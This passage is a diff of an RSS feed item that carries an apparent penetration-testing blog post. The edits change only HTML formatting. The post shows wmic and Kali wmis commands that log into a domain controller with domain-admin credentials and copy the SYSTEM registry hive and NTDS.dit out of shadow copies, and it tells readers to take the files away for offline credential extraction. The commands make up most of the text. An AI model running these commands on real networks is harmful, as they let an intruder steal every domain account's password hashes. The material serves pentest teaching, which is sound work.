 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the NTDS.dit (notice this one isn&#39;t in System32):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
 NTSTATUS: NT_STATUS_OK - Success
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy those files to your own system for offline extraction which I&#39;ll cover in part 2.&lt;/p&gt;
 </description>
     </item>
     
